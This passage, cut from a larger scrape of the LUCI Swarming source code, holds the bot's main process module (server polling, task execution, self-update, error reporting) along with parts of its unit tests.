bot\n\n\nclass TestBot(unittest.TestCase):\n  def test_bot(self):\n    obj = bot.Bot(\n        {'dimensions': {'foo': 'bar'}},\n        'https://localhost:1',\n        '1234-1a2b3c4-tainted-joe',\n        'base_dir',\n        None)\n    self.assertEqual({'foo': 'bar'}, obj.dimensions)\n    self.assertEqual(\n        os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip'),\n        obj.swarming_bot_zip)\n    self.assertEqual('1234-1a2b3c4-tainted-joe', obj.server_version)\n    self.assertEqual('base_dir', obj.base_dir)\n\n  def test_bot_call_later(self):\n    obj = bot.Bot({}, 'https://localhost:1', '1234-1a2b3c4-tainted-joe',\n                  'base_dir', None)\n    ev = threading.Event()\n    obj.call_later(0.001, ev.set)\n    self.assertTrue(ev.wait(1))\n\n  def test_bot_call_later_cancel(self):\n    obj = bot.Bot({}, 'https://localhost:1', '1234-1a2b3c4-tainted-joe',\n                  'base_dir', None)\n    ev = threading.Event()\n    obj.call_later(0.1, ev.set)\n    obj.cancel_all_timers()\n    self.assertFalse(ev.wait(0.3))\n\n\nif __name__ == '__main__':\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  unittest.main()\n/n/n/nappengine/swarming/swarming_bot/bot_code/bot_main.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Swarming bot main process.\n\nThis is the program that communicates with the Swarming server, ensures the code\nis always up to date and executes a child process to run tasks and upload\nresults back.\n\nIt manages self-update and rebooting the host in case of problems.\n\nSet the environment variable SWARMING_LOAD_TEST=1 to disable the use of\nserver-provided bot_config.py. This permits safe load testing.\n\"\"\"\n\nimport contextlib\nimport json\nimport logging\nimport optparse\nimport os\nimport shutil\nimport signal\nimport sys\nimport tempfile\nimport threading\nimport time\nimport traceback\nimport zipfile\n\nimport common\nimport singleton\nfrom api import bot\nfrom api import os_utilities\nfrom utils import file_path\nfrom utils import net\nfrom utils import on_error\nfrom utils import subprocess42\nfrom utils import zip_package\n\n\n# Used to opportunistically set the error handler to notify the server when the\n# process exits due to an exception.\n_ERROR_HANDLER_WAS_REGISTERED = False\n\n\n# Set to the zip's name containing this file. This is set to the absolute path\n# to swarming_bot.zip when run as part of swarming_bot.zip. This value is\n# overriden in unit tests.\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n\n# The singleton, initially unset.\nSINGLETON = singleton.Singleton(os.path.dirname(THIS_FILE))\n\n\n### bot_config handler part.\n\n\ndef _in_load_test_mode():\n  \"\"\"Returns True if the default values should be used instead of the server\n  provided bot_config.py.\n\n  This also disables server telling the bot to restart.\n  \"\"\"\n  return os.environ.get('SWARMING_LOAD_TEST') == '1'\n\n\ndef get_dimensions(botobj):\n  \"\"\"Returns bot_config.py's get_attributes() dict.\"\"\"\n  # Importing this administrator provided script could have side-effects on\n  # startup. That is why it is imported late.\n  try:\n    if _in_load_test_mode():\n      # Returns a minimal set of dimensions so it doesn't run tasks by error.\n      dimensions = os_utilities.get_dimensions()\n      return {\n        'id': dimensions['id'],\n        'load_test': ['1'],\n      }\n\n    from config import bot_config\n    out = bot_config.get_dimensions(botobj)\n    if not isinstance(out, dict):\n      raise ValueError('Unexpected type %s' % out.__class__)\n    return out\n  except Exception as e:\n    logging.exception('get_dimensions() failed')\n    try:\n      out = os_utilities.get_dimensions()\n      out['error'] = [str(e)]\n      out['quarantined'] = ['1']\n      return out\n    except Exception as e:\n      try:\n        botid = os_utilities.get_hostname_short()\n      except Exception as e2:\n        botid = 'error_%s' % str(e2)\n      return {\n          'id': [botid],\n          'error': ['%s\\n%s' % (e, traceback.format_exc()[-2048:])],\n          'quarantined': ['1'],\n        }\n\n\ndef get_state(botobj, sleep_streak):\n  \"\"\"Returns dict with a state of the bot reported to the server with each poll.\n  \"\"\"\n  try:\n    if _in_load_test_mode():\n      state = os_utilities.get_state()\n      state['dimensions'] = os_utilities.get_dimensions()\n    else:\n      from config import bot_config\n      state = bot_config.get_state(botobj)\n      if not isinstance(state, dict):\n        state = {'error': state}\n  except Exception as e:\n    logging.exception('get_state() failed')\n    state = {\n      'error': '%s\\n%s' % (e, traceback.format_exc()[-2048:]),\n      'quarantined': True,\n    }\n\n  state['sleep_streak'] = sleep_streak\n  return state\n\n\ndef call_hook(botobj, name, *args):\n  \"\"\"Calls a hook function in bot_config.py.\"\"\"\n  try:\n    if _in_load_test_mode():\n      return\n\n    logging.info('call_hook(%s)', name)\n    from config import bot_config\n    hook = getattr(bot_config, name, None)\n    if hook:\n      return hook(botobj, *args)\n  except Exception as e:\n    msg = '%s\\n%s' % (e, traceback.format_exc()[-2048:])\n    botobj.post_error('Failed to call hook %s(): %s' % (name, msg))\n\n\ndef setup_bot(skip_reboot):\n  \"\"\"Calls bot_config.setup_bot() to have the bot self-configure itself.\n\n  Reboot the host if bot_config.setup_bot() returns False, unless skip_reboot is\n  also true.\n  \"\"\"\n  if _in_load_test_mode():\n    return\n\n  botobj = get_bot()\n  try:\n    from config import bot_config\n  except Exception as e:\n    msg = '%s\\n%s' % (e, traceback.format_exc()[-2048:])\n    botobj.post_error('bot_config.py is bad: %s' % msg)\n    return\n\n  try:\n    should_continue = bot_config.setup_bot(botobj)\n  except Exception as e:\n    msg = '%s\\n%s' % (e, traceback.format_exc()[-2048:])\n    botobj.post_error('bot_config.setup_bot() threw: %s' % msg)\n    return\n\n  if not should_continue and not skip_reboot:\n    botobj.restart('Starting new swarming bot: %s' % THIS_FILE)\n\n\n### end of bot_config handler part.\n\n\ndef get_min_free_space():\n  \"\"\"Returns free disk space needed.\n\n  Add a \"250 MiB slack space\" for logs, temporary files and whatever other leak.\n  \"\"\"\n  return int((os_utilities.get_min_free_space(THIS_FILE) + 250.) * 1024 * 1024)\n\n\ndef generate_version():\n  \"\"\"Returns the bot's code version.\"\"\"\n  try:\n    return zip_package.generate_version()\n  except Exception as e:\n    return 'Error: %s' % e\n\n\ndef get_attributes(botobj):\n  \"\"\"Returns the attributes sent to the server.\n\n  Each called function catches all exceptions so the bot doesn't die on startup,\n  which is annoying to recover. In that case, we set a special property to catch\n  these and help the admin fix the swarming_bot code more quickly.\n\n  Arguments:\n  - botobj: bot.Bot instance or None\n  \"\"\"\n  return {\n    'dimensions': get_dimensions(botobj),\n    'state': get_state(botobj, 0),\n    'version': generate_version(),\n  }\n\n\ndef post_error_task(botobj, error, task_id):\n  \"\"\"Posts given error as failure cause for the task.\n\n  This is used in case of internal code error, and this causes the task to\n  become BOT_DIED.\n\n  Arguments:\n    botobj: A bot.Bot instance.\n    error: String representing the problem.\n    task_id: Task that had an internal error. When the Swarming server sends\n        commands to a bot, even though they could be completely wrong, the\n        server assumes the job as running. Thus this function acts as the\n        exception handler for incoming commands from the Swarming server. If for\n        any reason the local test runner script can not be run successfully,\n        this function is invoked.\n  \"\"\"\n  logging.error('Error: %s', error)\n  data = {\n    'id': botobj.id,\n    'message': error,\n    'task_id': task_id,\n  }\n  return net.url_read_json(\n      botobj.server + '/swarming/api/v1/bot/task_error/%s' % task_id, data=data)\n\n\ndef on_shutdown_hook(b):\n  \"\"\"Called when the bot is restarting.\"\"\"\n  call_hook(b, 'on_bot_shutdown')\n  # Aggressively set itself up so we ensure the auto-reboot configuration is\n  # fine before restarting the host. This is important as some tasks delete the\n  # autorestart script (!)\n  setup_bot(True)\n\n\ndef get_bot():\n  \"\"\"Returns a valid Bot instance.\n\n  Should only be called once in the process lifetime.\n  \"\"\"\n  # This variable is used to bootstrap the initial bot.Bot object, which then is\n  # used to get the dimensions and state.\n  attributes = {\n    'dimensions': {u'id': ['none']},\n    'state': {},\n    'version': generate_version(),\n  }\n  config = get_config()\n  assert not config['server'].endswith('/'), config\n\n  # Create a temporary object to call the hooks.\n  botobj = bot.Bot(\n      attributes,\n      config['server'],\n      config['server_version'],\n      os.path.dirname(THIS_FILE),\n      on_shutdown_hook)\n  return bot.Bot(\n      get_attributes(botobj),\n      config['server'],\n      config['server_version'],\n      os.path.dirname(THIS_FILE),\n      on_shutdown_hook)\n\n\ndef clean_isolated_cache(botobj):\n  \"\"\"Asks run_isolated to clean its cache.\n\n  This may take a while but it ensures that in the case of a run_isolated run\n  failed and it temporarily used more space than min_free_disk, it can cleans up\n  the mess properly.\n\n  It will remove unexpected files, remove corrupted files, trim the cache size\n  based on the policies and update state.json.\n  \"\"\"\n  bot_dir = botobj.base_dir\n  cmd = [\n    sys.executable, THIS_FILE, 'run_isolated',\n    '--clean',\n    '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),\n    '--cache', os.path.join(bot_dir, 'cache'),\n    '--min-free-space', str(get_min_free_space()),\n  ]\n  logging.info('Running: %s', cmd)\n  try:\n    # Intentionally do not use a timeout, it can take a while to hash 50gb but\n    # better be safe than sorry.\n    proc = subprocess42.Popen(\n        cmd,\n        stdin=subprocess42.PIPE,\n        stdout=subprocess42.PIPE, stderr=subprocess42.STDOUT,\n        cwd=bot_dir,\n        detached=True,\n        close_fds=sys.platform != 'win32')\n    output, _ = proc.communicate(None)\n    logging.info('Result:\\n%s', output)\n    if proc.returncode:\n      botobj.post_error(\n          'swarming_bot.zip failure during run_isolated --clean:\\n%s' % output)\n  except OSError:\n    botobj.post_error(\n        'swarming_bot.zip internal failure during run_isolated --clean')\n\n\ndef run_bot(arg_error):\n  \"\"\"Runs the bot until it reboots or self-update or a signal is received.\n\n  When a signal is received, simply exit.\n  \"\"\"\n  quit_bit = threading.Event()\n  def handler(sig, _):\n    logging.info('Got signal %s', sig)\n    quit_bit.set()\n\n  # TODO(maruel): Set quit_bit when stdin is closed on Windows.\n\n  with subprocess42.set_signal_handler(subprocess42.STOP_SIGNALS, handler):\n    config = get_config()\n    try:\n      # First thing is to get an arbitrary url. This also ensures the network is\n      # up and running, which is necessary before trying to get the FQDN below.\n      resp = net.url_read(config['server'] + '/swarming/api/v1/bot/server_ping')\n      if resp is None:\n        logging.error('No response from server_ping')\n    except Exception as e:\n      # url_read() already traps pretty much every exceptions. This except\n      # clause is kept there \"just in case\".\n      logging.exception('server_ping threw')\n\n    if quit_bit.is_set():\n      logging.info('Early quit 1')\n      return 0\n\n    # If this fails, there's hardly anything that can be done, the bot can't\n    # even get to the point to be able to self-update.\n    botobj = get_bot()\n    resp = net.url_read_json(\n        botobj.server + '/swarming/api/v1/bot/handshake',\n        data=botobj._attributes)\n    if not resp:\n      logging.error('Failed to contact for handshake')\n    else:\n      logging.info('Connected to %s', resp.get('server_version'))\n      if resp.get('bot_version') != botobj._attributes['version']:\n        logging.warning(\n            'Found out we\\'ll need to update: server said %s; we\\'re %s',\n            resp.get('bot_version'), botobj._attributes['version'])\n\n    if arg_error:\n      botobj.post_error('Bootstrapping error: %s' % arg_error)\n\n    if quit_bit.is_set():\n      logging.info('Early quit 2')\n      return 0\n\n    clean_isolated_cache(botobj)\n\n    call_hook(botobj, 'on_bot_startup')\n\n    if quit_bit.is_set():\n      logging.info('Early quit 3')\n      return 0\n\n    # This environment variable is accessible to the tasks executed by this bot.\n    os.environ['SWARMING_BOT_ID'] = botobj.id.encode('utf-8')\n\n    # Remove the 'work' directory if present, as not removing it may cause the\n    # bot to stay quarantined and not be able to get out of this state.\n    work_dir = os.path.join(botobj.base_dir, 'work')\n    try:\n      if os.path.isdir(work_dir):\n        file_path.rmtree(work_dir)\n    except Exception as e:\n      botobj.post_error('Failed to remove work: %s' % e)\n\n    consecutive_sleeps = 0\n    while not quit_bit.is_set():\n      try:\n        botobj.update_dimensions(get_dimensions(botobj))\n        botobj.update_state(get_state(botobj, consecutive_sleeps))\n        did_something = poll_server(botobj, quit_bit)\n        if did_something:\n          consecutive_sleeps = 0\n        else:\n          consecutive_sleeps += 1\n      except Exception as e:\n        logging.exception('poll_server failed')\n        msg = '%s\\n%s' % (e, traceback.format_exc()[-2048:])\n        botobj.post_error(msg)\n        consecutive_sleeps = 0\n    logging.info('Quitting')\n\n  # Tell the server we are going away.\n  botobj.post_event('bot_shutdown', 'Signal was received')\n  botobj.cancel_all_timers()\n  return 0\n\n\ndef poll_server(botobj, quit_bit):\n  \"\"\"Polls the server to run one loop.\n\n  Returns True if executed some action, False if server asked the bot to sleep.\n  \"\"\"\n  # Access to a protected member _XXX of a client class - pylint: disable=W0212\n  start = time.time()\n  resp = net.url_read_json(\n     botobj.server + '/swarming/api/v1/bot/poll', data=botobj._attributes)\n  if not resp:\n    return False\n  logging.debug('Server response:\\n%s', resp)\n\n  cmd = resp['cmd']\n  if cmd == 'sleep':\n    quit_bit.wait(resp['duration'])\n    return False\n\n  if cmd == 'terminate':\n    quit_bit.set()\n    # This is similar to post_update() in task_runner.py.\n    params = {\n      'cost_usd': 0,\n      'duration': 0,\n      'exit_code': 0,\n      'hard_timeout': False,\n      'id': botobj.id,\n      'io_timeout': False,\n      'output': '',\n      'output_chunk_start': 0,\n      'task_id': resp['task_id'],\n    }\n    net.url_read_json(\n        botobj.server + '/swarming/api/v1/bot/task_update/%s' % resp['task_id'],\n        data=params)\n    return False\n\n  if cmd == 'run':\n    if run_manifest(botobj, resp['manifest'], start):\n      # Completed a task successfully so update swarming_bot.zip if necessary.\n      update_lkgbc(botobj)\n    # TODO(maruel): Handle the case where quit_bit.is_set() happens here. This\n    # is concerning as this means a signal (often SIGTERM) was received while\n    # running the task. Make sure the host is properly restarting.\n  elif cmd == 'update':\n    update_bot(botobj, resp['version'])\n  elif cmd == 'restart':\n    if _in_load_test_mode():\n      logging.warning('Would have restarted: %s' % resp['message'])\n    else:\n      botobj.restart(resp['message'])\n  else:\n    raise ValueError('Unexpected command: %s\\n%s' % (cmd, resp))\n\n  return True\n\n\ndef run_manifest(botobj, manifest, start):\n  \"\"\"Defers to task_runner.py.\n\n  Return True if the task succeeded.\n  \"\"\"\n  # Ensure the manifest is valid. This can throw a json decoding error. Also\n  # raise if it is empty.\n  if not manifest:\n    raise ValueError('Empty manifest')\n\n  # Necessary to signal an internal_failure. This occurs when task_runner fails\n  # to execute the command. It is important to note that this data is extracted\n  # before any I/O is done, like writting the manifest to disk.\n  task_id = manifest['task_id']\n  hard_timeout = manifest['hard_timeout'] or None\n  # Default the grace period to 30s here, this doesn't affect the grace period\n  # for the actual task.\n  grace_period = manifest['grace_period'] or 30\n  if manifest['hard_timeout']:\n    # One for the child process, one for run_isolated, one for task_runner.\n    hard_timeout += 3 * manifest['grace_period']\n    # For isolated task, download time is not counted for hard timeout so add\n    # more time.\n    if not manifest['command']:\n      hard_timeout += manifest['io_timeout'] or 600\n\n  url = manifest.get('host', botobj.server)\n  task_dimensions = manifest['dimensions']\n  task_result = {}\n\n  failure = False\n  internal_failure = False\n  msg = None\n  work_dir = os.path.join(botobj.base_dir, 'work')\n  try:\n    try:\n      if os.path.isdir(work_dir):\n        file_path.rmtree(work_dir)\n    except OSError:\n      # If a previous task created an undeleteable file/directory inside 'work',\n      # make sure that following tasks are not affected. This is done by working\n      # around the undeleteable directory by creating a temporary directory\n      # instead. This is not normal behavior. The bot will report a failure on\n      # start.\n      work_dir = tempfile.mkdtemp(dir=botobj.base_dir, prefix='work')\n    else:\n      os.makedirs(work_dir)\n\n    env = os.environ.copy()\n    # Windows in particular does not tolerate unicode strings in environment\n    # variables.\n    env['SWARMING_TASK_ID'] = task_id.encode('ascii')\n\n    task_in_file = os.path.join(work_dir, 'task_runner_in.json')\n    with open(task_in_file, 'wb') as f:\n      f.write(json.dumps(manifest))\n    call_hook(botobj, 'on_before_task')\n    task_result_file = os.path.join(work_dir, 'task_runner_out.json')\n    if os.path.exists(task_result_file):\n      os.remove(task_result_file)\n    command = [\n      sys.executable, THIS_FILE, 'task_runner',\n      '--swarming-server', url,\n      '--in-file', task_in_file,\n      '--out-file', task_result_file,\n      '--cost-usd-hour', str(botobj.state.get('cost_usd_hour') or 0.),\n      # Include the time taken to poll the task in the cost.\n      '--start', str(start),\n      '--min-free-space', str(get_min_free_space()),\n    ]\n    logging.debug('Running command: %s', command)\n    # Put the output file into the current working directory, which should be\n    # the one containing swarming_bot.zip.\n    log_path = os.path.join(botobj.base_dir, 'logs', 'task_runner_stdout.log')\n    os_utilities.roll_log(log_path)\n    os_utilities.trim_rolled_log(log_path)\n    with open(log_path, 'a+b') as f:\n      proc = subprocess42.Popen(\n          command,\n          detached=True,\n          cwd=botobj.base_dir,\n          env=env,\n          stdin=subprocess42.PIPE,\n          stdout=f,\n          stderr=subprocess42.STDOUT,\n          close_fds=sys.platform != 'win32')\n      try:\n        proc.wait(hard_timeout)\n      except subprocess42.TimeoutExpired:\n        # That's the last ditch effort; as task_runner should have completed a\n        # while ago and had enforced the timeout itself (or run_isolated for\n        # hard_timeout for isolated task).\n        logging.error('Sending SIGTERM to task_runner')\n        proc.terminate()\n        internal_failure = True\n        msg = 'task_runner hung'\n        try:\n          proc.wait(grace_period)\n        except subprocess42.TimeoutExpired:\n          logging.error('Sending SIGKILL to task_runner')\n          proc.kill()\n        proc.wait()\n        return False\n\n    logging.info('task_runner exit: %d', proc.returncode)\n    if os.path.exists(task_result_file):\n      with open(task_result_file, 'rb') as fd:\n        task_result = json.load(fd)\n\n    if proc.returncode:\n      msg = 'Execution failed: internal error (%d).' % proc.returncode\n      internal_failure = True\n    elif not task_result:\n      logging.warning('task_runner failed to write metadata')\n      msg = 'Execution failed: internal error (no metadata).'\n      internal_failure = True\n    elif task_result[u'must_signal_internal_failure']:\n      msg = (\n        'Execution failed: %s' % task_result[u'must_signal_internal_failure'])\n      internal_failure = True\n\n    failure = bool(task_result.get('exit_code')) if task_result else False\n    return not internal_failure and not failure\n  except Exception as e:\n    # Failures include IOError when writing if the disk is full, OSError if\n    # swarming_bot.zip doesn't exist anymore, etc.\n    logging.exception('run_manifest failed')\n    msg = 'Internal exception occured: %s\\n%s' % (\n        e, traceback.format_exc()[-2048:])\n    internal_failure = True\n  finally:\n    if internal_failure:\n      post_error_task(botobj, msg, task_id)\n    call_hook(\n        botobj, 'on_after_task', failure, internal_failure, task_dimensions,\n        task_result)\n    if os.path.isdir(work_dir):\n      try:\n        file_path.rmtree(work_dir)\n      except Exception as e:\n        botobj.post_error(\n            'Failed to delete work directory %s: %s' % (work_dir, e))\n\n\ndef update_bot(botobj, version):\n  \"\"\"Downloads the new version of the bot code and then runs it.\n\n  Use alternating files; first load swarming_bot.1.zip, then swarming_bot.2.zip,\n  never touching swarming_bot.zip which was the originally bootstrapped file.\n\n  LKGBC is handled by update_lkgbc().\n\n  Does not return.\n  \"\"\"\n  # Alternate between .1.zip and .2.zip.\n  new_zip = 'swarming_bot.1.zip'\n  if os.path.basename(THIS_FILE) == new_zip:\n    new_zip = 'swarming_bot.2.zip'\n  new_zip = os.path.join(os.path.dirname(THIS_FILE), new_zip)\n\n  # Download as a new file.\n  url = botobj.server + '/swarming/api/v1/bot/bot_code/%s' % version\n  if not net.url_retrieve(new_zip, url):\n    # It can happen when a server is rapidly updated multiple times in a row.\n    botobj.post_error(\n        'Unable to download %s from %s; first tried version %s' %\n        (new_zip, url, version))\n    # Poll again, this may work next time. To prevent busy-loop, sleep a little.\n    time.sleep(2)\n    return\n\n  s = os.stat(new_zip)\n  logging.info('Restarting to %s; %d bytes.', new_zip, s.st_size)\n  sys.stdout.flush()\n  sys.stderr.flush()\n\n  proc = subprocess42.Popen(\n     [sys.executable, new_zip, 'is_fine'],\n     stdout=subprocess42.PIPE, stderr=subprocess42.STDOUT)\n  output, _ = proc.communicate()\n  if proc.returncode:\n    botobj.post_error(\n        'New bot code is bad: proc exit = %s. stdout:\\n%s' %\n        (proc.returncode, output))\n    # Poll again, the server may have better code next time. To prevent\n    # busy-loop, sleep a little.\n    time.sleep(2)\n    return\n\n  # Don't forget to release the singleton before restarting itself.\n  SINGLETON.release()\n\n  # Do not call on_bot_shutdown.\n  # On OSX, launchd will be unhappy if we quit so the old code bot process has\n  # to outlive the new code child process. Launchd really wants the main process\n  # to survive, and it'll restart it if it disappears. os.exec*() replaces the\n  # process so this is fine.\n  ret = common.exec_python([new_zip, 'start_slave', '--survive'])\n  if ret in (1073807364, -1073741510):\n    # 1073807364 is returned when the process is killed due to shutdown. No need\n    # to alert anyone in that case.\n    # -1073741510 is returned when rebooting too. This can happen when the\n    # parent code was running the old version and gets confused and decided to\n    # poll again.\n    # In any case, zap out the error code.\n    ret = 0\n  elif ret:\n    botobj.post_error('Bot failed to respawn after update: %s' % ret)\n  sys.exit(ret)\n\n\ndef update_lkgbc(botobj):\n  \"\"\"Updates the Last Known Good Bot Code if necessary.\"\"\"\n  try:\n    if not os.path.isfile(THIS_FILE):\n      botobj.post_error('Missing file %s for LKGBC' % THIS_FILE)\n      return\n\n    golden = os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')\n    if os.path.isfile(golden):\n      org = os.stat(golden)\n      cur = os.stat(THIS_FILE)\n      if org.st_size == org.st_size and org.st_mtime >= cur.st_mtime:\n        return\n\n    # Copy the file back.\n    shutil.copy(THIS_FILE, golden)\n  except Exception as e:\n    botobj.post_error('Failed to update LKGBC: %s' % e)\n\n\ndef get_config():\n  \"\"\"Returns the data from config.json.\"\"\"\n  global _ERROR_HANDLER_WAS_REGISTERED\n\n  with contextlib.closing(zipfile.ZipFile(THIS_FILE, 'r')) as f:\n    config = json.load(f.open('config/config.json', 'r'))\n\n  server = config.get('server', '')\n  if not _ERROR_HANDLER_WAS_REGISTERED and server:\n    on_error.report_on_exception_exit(server)\n    _ERROR_HANDLER_WAS_REGISTERED = True\n  return config\n\n\ndef main(args):\n  # Add SWARMING_HEADLESS into environ so subcommands know that they are running\n  # in a headless (non-interactive) mode.\n  os.environ['SWARMING_HEADLESS'] = '1'\n\n  # The only reason this is kept is to enable the unit test to use --help to\n  # quit the process.\n  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)\n  _, args = parser.parse_args(args)\n\n  # Enforces that only one process with a bot in this directory can be run on\n  # this host at once.\n  if not SINGLETON.acquire():\n    if sys.platform == 'darwin':\n      msg = (\n          'Found a previous bot, %d rebooting as a workaround for '\n          'https://crbug.com/569610.') % os.getpid()\n      print >> sys.stderr, msg\n      os_utilities.restart(msg)\n    else:\n      print >> sys.stderr, 'Found a previous bot, %d exiting.' % os.getpid()\n    return 1\n\n  for t in ('out', 'err'):\n    log_path = os.path.join(\n        os.path.dirname(THIS_FILE), 'logs', 'bot_std%s.log' % t)\n    os_utilities.roll_log(log_path)\n    os_utilities.trim_rolled_log(log_path)\n\n  error = None\n  if len(args) != 0:\n    error = 'Unexpected arguments: %s' % args\n  try:\n    return run_bot(error)\n  finally:\n    call_hook(bot.Bot(None, None, None, os.path.dirname(THIS_FILE), None),\n              'on_bot_shutdown')\n    logging.info('main() returning')\n/n/n/nappengine/swarming/swarming_bot/bot_code/bot_main_test.py/n/n#!/usr/bin/env python\n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport json\nimport logging\nimport os\nimport shutil\nimport sys\nimport tempfile\nimport threading\nimport time\nimport unittest\nimport zipfile\n\nimport test_env_bot_code\ntest_env_bot_code.setup_test_env()\n\n# Creates a server mock for functions in net.py.\nimport net_utils\n\nimport bot_main\nfrom api import bot\nfrom api import os_utilities\nfrom depot_tools import fix_encoding\nfrom utils import file_path\nfrom utils import logging_utils\nfrom utils import net\nfrom utils import subprocess42\nfrom utils import zip_package\n\n\n# Access to a protected member XX of a client class - pylint: disable=W0212\n\n\nclass TestBotMain(net_utils.TestCase):\n  maxDiff = 2000\n\n  def setUp(self):\n    super(TestBotMain, self).setUp()\n    os.environ.pop('SWARMING_LOAD_TEST', None)\n    self.root_dir = tempfile.mkdtemp(prefix='bot_main')\n    self.old_cwd = os.getcwd()\n    os.chdir(self.root_dir)\n    # __main__ does it for us.\n    os.mkdir('logs')\n    self.url = 'https://localhost:1'\n    self.attributes = {\n      'dimensions': {\n        'foo': ['bar'],\n        'id': ['localhost'],\n        'pool': ['default'],\n      },\n      'state': {\n        'cost_usd_hour': 3600.,\n        'sleep_streak': 0,\n      },\n      'version': '123',\n    }\n    self.mock(zip_package, 'generate_version', lambda: '123')\n    self.bot = bot.Bot(\n        self.attributes, 'https://localhost:1', 'version1', self.root_dir,\n        self.fail)\n    self.mock(self.bot, 'post_error', self.fail)\n    self.mock(self.bot, 'restart', self.fail)\n    self.mock(subprocess42, 'call', self.fail)\n    self.mock(time, 'time', lambda: 100.)\n    config_path = os.path.join(\n        test_env_bot_code.BOT_DIR, 'config', 'config.json')\n    with open(config_path, 'rb') as f:\n      config = json.load(f)\n    self.mock(bot_main, 'get_config', lambda: config)\n    self.mock(\n        bot_main, 'THIS_FILE',\n        os.path.join(test_env_bot_code.BOT_DIR, 'swarming_bot.zip'))\n\n  def tearDown(self):\n    os.environ.pop('SWARMING_BOT_ID', None)\n    os.chdir(self.old_cwd)\n    file_path.rmtree(self.root_dir)\n    super(TestBotMain, self).tearDown()\n\n  def test_get_dimensions(self):\n    dimensions = set(bot_main.get_dimensions(None))\n    dimensions.discard('hidpi')\n    dimensions.discard('zone')  # Only set on GCE bots.\n    expected = {'cores', 'cpu', 'gpu', 'id', 'machine_type', 'os', 'pool'}\n    self.assertEqual(expected, dimensions)\n\n  def test_get_dimensions_load_test(self):\n    os.environ['SWARMING_LOAD_TEST'] = '1'\n    self.assertEqual(['id', 'load_test'], sorted(bot_main.get_dimensions(None)))\n\n  def test_generate_version(self):\n    self.assertEqual('123', bot_main.generate_version())\n\n  def test_get_state(self):\n    self.mock(time, 'time', lambda: 126.0)\n    expected = os_utilities.get_state()\n    expected['sleep_streak'] = 12\n    # During the execution of this test case, the free disk space could have\n    # changed.\n    for disk in expected['disks'].itervalues():\n      self.assertGreater(disk.pop('free_mb'), 1.)\n    actual = bot_main.get_state(None, 12)\n    for disk in actual['disks'].itervalues():\n      self.assertGreater(disk.pop('free_mb'), 1.)\n    self.assertGreater(actual.pop('nb_files_in_temp'), 0)\n    self.assertGreater(expected.pop('nb_files_in_temp'), 0)\n    self.assertGreater(actual.pop('uptime'), 0)\n    self.assertGreater(expected.pop('uptime'), 0)\n    self.assertEqual(sorted(expected.pop('temp', {})),\n                     sorted(actual.pop('temp', {})))\n    self.assertEqual(expected, actual)\n\n  def test_setup_bot(self):\n    setup_bots = []\n    def setup_bot(_bot):\n      setup_bots.append(1)\n      return False\n    from config import bot_config\n    self.mock(bot_config, 'setup_bot', setup_bot)\n    restarts = []\n    post_event = []\n    self.mock(\n        os_utilities, 'restart', lambda *a, **kw: restarts.append((a, kw)))\n    self.mock(\n        bot.Bot, 'post_event', lambda *a, **kw: post_event.append((a, kw)))\n    self.expected_requests([])\n    bot_main.setup_bot(False)\n    expected = [\n      (('Starting new swarming bot: %s' % bot_main.THIS_FILE,),\n        {'timeout': 900}),\n    ]\n    self.assertEqual(expected, restarts)\n    # It is called twice, one as part of setup_bot(False), another as part of\n    # on_shutdown_hook().\n    self.assertEqual([1, 1], setup_bots)\n    expected = [\n      'Starting new swarming bot: %s' % bot_main.THIS_FILE,\n      'Bot is stuck restarting for: Starting new swarming bot: %s' %\n        bot_main.THIS_FILE,\n    ]\n    self.assertEqual(expected, [i[0][2] for i in post_event])\n\n  def test_post_error_task(self):\n    self.mock(time, 'time', lambda: 126.0)\n    self.mock(logging, 'error', lambda *_, **_kw: None)\n    self.mock(\n        bot_main, 'get_config',\n        lambda: {'server': self.url, 'server_version': '1'})\n    expected_attribs = bot_main.get_attributes(None)\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/task_error/23',\n            {\n              'data': {\n                'id': expected_attribs['dimensions']['id'][0],\n                'message': 'error',\n                'task_id': 23,\n              },\n            },\n            {'resp': 1},\n          ),\n        ])\n    botobj = bot_main.get_bot()\n    self.assertEqual({'resp': 1}, bot_main.post_error_task(botobj, 'error', 23))\n\n  def test_run_bot(self):\n    # Test the run_bot() loop. Does not use self.bot.\n    self.mock(time, 'time', lambda: 126.0)\n    class Foo(Exception):\n      pass\n\n    def poll_server(botobj, _):\n      sleep_streak = botobj.state['sleep_streak']\n      self.assertEqual(self.url, botobj.server)\n      if sleep_streak == 5:\n        raise Exception('Jumping out of the loop')\n      return False\n    self.mock(bot_main, 'poll_server', poll_server)\n\n    def post_error(botobj, e):\n      self.assertEqual(self.url, botobj.server)\n      lines = e.splitlines()\n      self.assertEqual('Jumping out of the loop', lines[0])\n      self.assertEqual('Traceback (most recent call last):', lines[1])\n      raise Foo('Necessary to get out of the loop')\n    self.mock(bot.Bot, 'post_error', post_error)\n\n    self.mock(\n        bot_main, 'get_config',\n        lambda: {'server': self.url, 'server_version': '1'})\n    self.mock(\n        bot_main, 'get_dimensions', lambda _: self.attributes['dimensions'])\n    self.mock(os_utilities, 'get_state', lambda *_: self.attributes['state'])\n\n    # Method should have \"self\" as first argument - pylint: disable=E0213\n    # pylint: disable=unused-argument\n    class Popen(object):\n      def __init__(\n          self2, cmd, detached, cwd, stdout, stderr, stdin, close_fds):\n        self2.returncode = None\n        expected = [sys.executable, bot_main.THIS_FILE, 'run_isolated']\n        self.assertEqual(expected, cmd[:len(expected)])\n        self.assertEqual(True, detached)\n        self.assertEqual(subprocess42.PIPE, stdout)\n        self.assertEqual(subprocess42.STDOUT, stderr)\n        self.assertEqual(subprocess42.PIPE, stdin)\n        self.assertEqual(sys.platform != 'win32', close_fds)\n\n      def communicate(self2, i):\n        self.assertEqual(None, i)\n        self2.returncode = 0\n        return '', None\n    self.mock(subprocess42, 'Popen', Popen)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/server_ping',\n            {}, 'foo', None,\n          ),\n          (\n            